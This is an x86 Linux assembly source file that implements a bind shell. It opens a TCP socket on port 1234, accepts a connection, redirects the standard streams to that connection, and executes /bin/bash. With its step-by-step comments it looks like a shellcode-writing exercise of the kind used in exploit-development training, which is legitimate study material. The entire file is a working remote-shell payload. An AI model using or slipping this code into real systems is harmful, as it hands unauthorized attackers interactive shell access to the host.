global _start

section .text

_start:
	;---------------------------------------
	; socket syscall
	mov eax,102	; socket syscall
	mov ebx,1	; subcall

	push 0		; argument protocol
	push 1		; argument type SOCK_STREAM
	push 2		; argument domain AF_INET
	mov ecx,esp	; adress of arguments

	int 0x80	; execute syscall, -> filedescriptor in eax
	mov edx,eax	; save filedescriptor to edx

	;---------------------------------------
	; bind syscall
        mov eax,102     ; socket syscall
        mov ebx,2       ; subcall

	;sockaddr struct
	push 0		; INADDR_ANY
	push WORD 0xD204	; Port: 1234 = 0x04D2, reverse 0xD204
	push WORD 2		; AF_INET
	mov ecx,esp	; save pointer to struct sockaddr

	;push arguments
	push 16		; addrlength
	push ecx	; sockaddr address
	push edx	; filedescriptor

	mov ecx,esp     ; adress of arguments

	int 0x80        ; execute syscall


	;---------------------------------------
	; listen syscall
 	mov eax,102     ; socket syscall
        mov ebx,4       ; subcall

	;arguments
	push 5		; backlog
	push edx	; filedescriptor 
	mov ecx,esp     ; adress of arguments

	int 0x80        ; execute syscall


        ;---------------------------------------
	; accept syscall
	mov eax,102     ; socket syscall
        mov ebx,5       ; subcall

	push 0		; socklen 0
	push 0		; sockaddr 0
	push edx	; filedescriptor
        mov ecx,esp     ; adress of arguments

        int 0x80        ; execute syscall

	mov edx,eax	; client fd


        ;---------------------------------------
	; dup2 syscall stdin

	mov eax,63	; dup2 syscall

	mov ebx,edx	; fd socket
	mov ecx,0	; stdin

        int 0x80        ; execute syscall



        ;---------------------------------------
        ; dup2 syscall stdout

        mov eax,63      ; dup2 syscall

        mov ebx,edx     ; fd socket
        mov ecx,1       ; stdout

        int 0x80        ; execute syscall


        ;---------------------------------------
        ; dup2 syscall stderr

        mov eax,63      ; dup2 syscall

        mov ebx,edx     ; fd socket
        mov ecx,2       ; stderr

        int 0x80        ; execute syscall



        ;---------------------------------------
        ; execve /bin/bash

        mov eax,11      ; dup2 syscall

	; push ////bin/bash on stack in reverse
	push 0		; null byte
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx,esp	; /bin/bash
	mov ecx,0
	mov edx,0


        int 0x80        ; execute syscall

